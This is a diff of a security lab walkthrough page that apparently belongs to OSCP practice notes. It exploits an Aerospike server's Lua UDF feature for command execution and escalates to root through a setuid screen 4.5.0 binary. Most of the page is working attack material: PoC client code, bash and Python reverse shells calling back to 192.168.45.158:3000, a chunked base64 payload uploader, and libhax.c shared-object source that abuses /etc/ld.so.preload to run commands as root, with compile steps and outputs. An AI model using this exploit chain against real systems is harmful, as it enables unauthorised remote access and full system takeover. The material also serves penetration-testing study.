+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] build:"</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="n">info_all</span><span class="p">(</span><span class="s2">"build"</span><span class="p">)</span><span class="o">.</span><span class="n">values</span><span class="p">())[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
 
-    <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">)))</span>
-    <span class="n">client</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="n">a</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">setname</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="p">{</span><span class="s2">&quot;pk&quot;</span><span class="p">:</span> <span class="n">key</span><span class="p">})</span>   <span class="c1"># needs a record to attach to</span>
-    <span class="n">client</span><span class="o">.</span><span class="n">udf_put</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">udf</span><span class="p">)</span>                                     <span class="c1"># register module &#39;poc&#39;</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] executing:&quot;</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="n">apply</span><span class="p">((</span><span class="n">a</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">setname</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="s2">&quot;poc&quot;</span><span class="p">,</span> <span class="s2">&quot;runCMD&quot;</span><span class="p">,</span> <span class="p">[</span><span class="n">a</span><span class="o">.</span><span class="n">cmd</span><span class="p">]))</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">)))</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="n">a</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">setname</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="p">{</span><span class="s2">"pk"</span><span class="p">:</span> <span class="n">key</span><span class="p">})</span>   <span class="c1"># needs a record to attach to</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">udf_put</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">udf</span><span class="p">)</span>                                     <span class="c1"># register module 'poc'</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] executing:"</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="n">apply</span><span class="p">((</span><span class="n">a</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">setname</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="s2">"poc"</span><span class="p">,</span> <span class="s2">"runCMD"</span><span class="p">,</span> <span class="p">[</span><span class="n">a</span><span class="o">.</span><span class="n">cmd</span><span class="p">]))</span>
     <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
 </pre></div>
 <p>Two prerequisites that are easy to miss and produce confusing errors:</p>
@@ -831,7 +831,7 @@ install it for root: <code>sudo python3 -m pip install --break-system-packages a
 <hr />
 <h3>4.3 First command</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--ahost<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--cmd<span class="w"> </span><span class="s1">&#39;id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt&#39;</span>
+<span class="w">  </span>--cmd<span class="w"> </span><span class="s1">'id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] build: 5.1.0.1
 [+] executing: id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt
@@ -869,8 +869,8 @@ listener you control and print the exit status — <code>io.popen</code> capture
 </pre></div>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## via the UDF — note the explicit rc, because stderr never comes back</span>
 <span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="m">8834</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;%s: &#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span>
-<span class="w">  </span>nc<span class="w"> </span>-zv<span class="w"> </span>-w3<span class="w"> </span><span class="m">192</span>.168.45.158<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-1
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'%s: '</span><span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2">"</span>
+<span class="w">  </span>nc<span class="w"> </span>-zv<span class="w"> </span>-w3<span class="w"> </span><span class="m">192</span>.168.45.158<span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2">"</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-1
 <span class="k">done</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">22: Connection refused
@@ -907,7 +907,7 @@ above 1024 so it needs no root, and — because it is Aerospike's own port — i
 nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">3000</span>
 </pre></div>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## via the UDF</span>
-timeout<span class="w"> </span><span class="m">5</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;echo SMOKE-3000 &gt;/dev/tcp/192.168.45.158/3000&#39;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">rc</span><span class="o">=</span><span class="nv">$?</span>
+timeout<span class="w"> </span><span class="m">5</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">'echo SMOKE-3000 &gt;/dev/tcp/192.168.45.158/3000'</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">rc</span><span class="o">=</span><span class="nv">$?</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">rc=0</span></pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">listening on [any] 3000 ...
@@ -927,7 +927,7 @@ apart, you cannot conclude anything about the network. Start the listener, then 
 <p>With <code>3000</code> proven bidirectional, the reverse shell is three lines. The child must be <strong>backgrounded
 with all three streams redirected</strong>, or <code>io.popen</code> blocks on <code>read()</code> until the client times out:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--ahost<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--cmd<span class="w"> </span><span class="s1">&#39;setsid bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.158/3000 0&gt;&amp;1&quot; &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;&#39;</span>
+<span class="w">  </span>--cmd<span class="w"> </span><span class="s1">'setsid bash -c "bash -i &gt;&amp; /dev/tcp/192.168.45.158/3000 0&gt;&amp;1" &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] build: 5.1.0.1
 [+] executing: setsid bash -c "bash -i &gt;&amp; /dev/tcp/192.168.45.158/3000 0&gt;&amp;1" &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;</span></pre></div>
@@ -944,29 +944,29 @@ what you are missing: no <code>sudo</code> prompt, no <code>su</code>, no <code>
 <code>TERM</code>. For a real PTY, spawn one from the target's own Python. Full payload in
 <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/revshell.py"><code>scripts/revshell.py</code></a>:</p>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
-<span class="sd">&quot;&quot;&quot;Connect back and hand the socket to a pty — a terminal, not a pipe.&quot;&quot;&quot;</span>
+<span class="sd">"""Connect back and hand the socket to a pty — a terminal, not a pipe."""</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">pty</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
 
-<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s2">&quot;192.168.45.158&quot;</span><span class="p">,</span> <span class="mi">3000</span>
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s2">"192.168.45.158"</span><span class="p">,</span> <span class="mi">3000</span>
 
 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
 <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
 <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
     <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="n">fd</span><span class="p">)</span>
-<span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
+<span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">)</span>
 </pre></div>
 <p>Staged through the UDF with a heredoc, then detached:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--ahost<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span>--cmd<span class="w"> </span><span class="s1">&#39;cat &gt; /tmp/.rs.py &lt;&lt;&quot;PY&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>poc_aerospike_rce.py<span class="w"> </span>--ahost<span class="w"> </span><span class="m">192</span>.168.152.143<span class="w"> </span>--cmd<span class="w"> </span><span class="s1">'cat &gt; /tmp/.rs.py &lt;&lt;"PY"</span>
 <span class="s1">import os, pty, socket</span>
 <span class="s1">s = socket.socket()</span>
-<span class="s1">s.connect((&quot;192.168.45.158&quot;, 3000))</span>
+<span class="s1">s.connect(("192.168.45.158", 3000))</span>
 <span class="s1">for fd in (0, 1, 2):</span>
 <span class="s1">    os.dup2(s.fileno(), fd)</span>
-<span class="s1">pty.spawn(&quot;/bin/bash&quot;)</span>
+<span class="s1">pty.spawn("/bin/bash")</span>
 <span class="s1">PY</span>
-<span class="s1">setsid nohup python3 /tmp/.rs.py &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;&#39;</span>
+<span class="s1">setsid nohup python3 /tmp/.rs.py &gt;/dev/null 2&gt;&amp;1 &lt;/dev/null &amp;'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38014
 aero@lab-pwk2-student-cl4-143-ubuntu20-aero-241-102:/$ id; tty
@@ -1024,12 +1024,12 @@ each <code>apply()</code> blocks a server thread. The compromise is <strong>chun
 with a small chunk size so no single call outlives the client timeout. The script is
 <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/poc_aerospike_upload.py"><code>scripts/poc_aerospike_upload.py</code></a>:</p>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">CHUNK</span> <span class="o">=</span> <span class="mi">3000</span>
-<span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">local</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+<span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">local</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
 
-<span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;rm -f </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">"rm -f </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">off</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b64</span><span class="p">),</span> <span class="n">CHUNK</span><span class="p">):</span>
-    <span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;printf &#39;%s&#39; &#39;</span><span class="si">{</span><span class="n">b64</span><span class="p">[</span><span class="n">off</span><span class="p">:</span><span class="n">off</span><span class="o">+</span><span class="n">CHUNK</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &gt;&gt; </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;base64 -d </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &gt; </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; rm -f </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &amp;&amp; chmod </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; sha256sum </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">"printf '%s' '</span><span class="si">{</span><span class="n">b64</span><span class="p">[</span><span class="n">off</span><span class="p">:</span><span class="n">off</span><span class="o">+</span><span class="n">CHUNK</span><span class="p">]</span><span class="si">}</span><span class="s2">' &gt;&gt; </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">"base64 -d </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &gt; </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; rm -f </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &amp;&amp; chmod </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; sha256sum </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 </pre></div>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.150.143<span class="w"> </span>python3<span class="w"> </span>poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>--local<span class="w"> </span>/tmp/screen_poc/libhax.so<span class="w"> </span>--remote<span class="w"> </span>/tmp/screenroot/libhax.so<span class="w"> </span>--mode<span class="w"> </span><span class="m">755</span>
@@ -1118,7 +1118,7 @@ hand. And <code>4.5.0</code> is the last version affected by <strong>CVE-2017-56
 <hr />
 <h3>5.3 The refutations</h3>
 <h4>PwnKit — patched binary, not just a patched version string</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>dpkg<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;^ii  policykit&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>dpkg<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"^ii  policykit"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ii  policykit-1  0.105-26ubuntu1.3  amd64  framework for managing administrative policies and privileges</span></pre></div>
 <p><code>0.105-26ubuntu1.3</code> is the Ubuntu security update that carries the CVE-2021-4034 fix. On an Ubuntu
@@ -1129,7 +1129,7 @@ and discarded; chapter 06 does not spend time on it.</p>
 <p>CVE-2022-0847 requires <strong>5.8+</strong>. This kernel is 5.4. The bug does not exist here, and no amount of
 PoC porting will create it.</p>
 <h4>The root cron</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/etc/crontab<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^#&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^$&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/etc/crontab<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^#'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^$'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">17 *  * * *  root  cd / &amp;&amp; run-parts --report /etc/cron.hourly
 25 6  * * *  root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
@@ -1167,7 +1167,7 @@ binary payload for this box has to be <strong>built on Kali and pushed through t
 version error. Compile against the oldest ABI that will run:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>gcc<span class="w"> </span>-Os<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>libhax.so<span class="w"> </span>libhax.c
 strip<span class="w"> </span>--strip-unneeded<span class="w"> </span>libhax.so
-objdump<span class="w"> </span>-T<span class="w"> </span>libhax.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">&#39;GLIBC_[0-9.]+&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV
+objdump<span class="w"> </span>-T<span class="w"> </span>libhax.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'GLIBC_[0-9.]+'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">GLIBC_2.2.5</span></pre></div>
 <p><code>GLIBC_2.2.5</code> only. That single line is the difference between a payload that preloads and one that
@@ -1218,7 +1218,7 @@ claims <code>screen 4.8.0</code>. That contradiction is the finding.</p></div></
 -rwsr-xr-x 1 root root 1860304 May 10  2021 /usr/bin/screen-4.5.0
 -rwxr-xr-x 1 root root  474280 Feb 23  2021 /usr/bin/screen.old</span></pre></div>
 <p>and the package database:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>dpkg<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;^ii  screen&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>dpkg<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"^ii  screen"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ii  screen  4.8.0-1ubuntu0.1  amd64  terminal multiplexer with VT100/ANSI terminal emulation</span></pre></div>
 <p>The <strong>package</strong> is <code>4.8.0-1ubuntu0.1</code> — Ubuntu's fully patched build. The <strong>binary being executed</strong> is
@@ -1291,10 +1291,10 @@ that produced yesterday's artefact, and a rebuilt <code>.so</code> must be hash-
 <h3>6.4 Modifying it (on Kali)</h3>
 <p>The upstream <code>libhax.c</code> is close, but three things in it decide whether you get root or a convincing
 nothing. All three are edits you make <strong>before</strong> compiling.</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cp">#define STAGE  &quot;/tmp/screenroot&quot;</span>
-<span class="cp">#define LOCK   STAGE &quot;/.lock&quot;</span>
-<span class="cp">#define SCRIPT STAGE &quot;/rootcmd.sh&quot;</span>
-<span class="cp">#define OUT    STAGE &quot;/rootout.txt&quot;</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cp">#define STAGE  "/tmp/screenroot"</span>
+<span class="cp">#define LOCK   STAGE "/.lock"</span>
+<span class="cp">#define SCRIPT STAGE "/rootcmd.sh"</span>
+<span class="cp">#define OUT    STAGE "/rootout.txt"</span>
 
 <span class="n">__attribute__</span><span class="w"> </span><span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
 <span class="kt">void</span><span class="w"> </span><span class="n">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
@@ -1307,12 +1307,12 @@ nothing. All three are edits you make <strong>before</strong> compiling.</p>
 <span class="w">        </span><span class="k">return</span><span class="p">;</span>
 <span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 
-<span class="w">    </span><span class="n">unlink</span><span class="p">(</span><span class="s">&quot;/etc/ld.so.preload&quot;</span><span class="p">);</span><span class="w">        </span><span class="cm">/* remove ourselves before spawning children */</span>
+<span class="w">    </span><span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span><span class="w">        </span><span class="cm">/* remove ourselves before spawning children */</span>
 
 <span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
-<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh &quot;</span><span class="w"> </span><span class="n">SCRIPT</span><span class="w"> </span><span class="s">&quot; &gt; &quot;</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="s">&quot; 2&gt;&amp;1&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh "</span><span class="w"> </span><span class="n">SCRIPT</span><span class="w"> </span><span class="s">" &gt; "</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="s">" 2&gt;&amp;1"</span><span class="p">);</span>
 <span class="w">    </span><span class="n">chmod</span><span class="p">(</span><span class="n">OUT</span><span class="p">,</span><span class="w"> </span><span class="mo">0666</span><span class="p">);</span>
 <span class="p">}</span>
 </pre></div>
@@ -1352,7 +1352,7 @@ nothing. Normalising the real uid and gid to 0 first means the child has no reas
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>gcc<span class="w"> </span>-Os<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-fno-asynchronous-unwind-tables<span class="w"> </span><span class="se">\</span>
 <span class="w">    </span>-o<span class="w"> </span>libhax.so<span class="w"> </span>libhax.c
 strip<span class="w"> </span>--strip-unneeded<span class="w"> </span>libhax.so
-objdump<span class="w"> </span>-T<span class="w"> </span>libhax.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">&#39;GLIBC_[0-9.]+&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV
+objdump<span class="w"> </span>-T<span class="w"> </span>libhax.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'GLIBC_[0-9.]+'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-uV
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">GLIBC_2.2.5</span></pre></div>
 <p>A second version string in that list — <code>GLIBC_2.34</code>, <code>GLIBC_2.38</code> — means the library was built
@@ -1421,14 +1421,14 @@ determines what you can re-run:</p>
 </tbody>
 </table>
 <p>So the file must be created <strong>by screen</strong> every time. Running as <code>aero</code>:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;/tmp/screenroot/libhax.so\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">rc</span><span class="o">=</span><span class="nv">$?</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'/tmp/screenroot/libhax.so\n'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">rc</span><span class="o">=</span><span class="nv">$?</span>
 </pre></div>
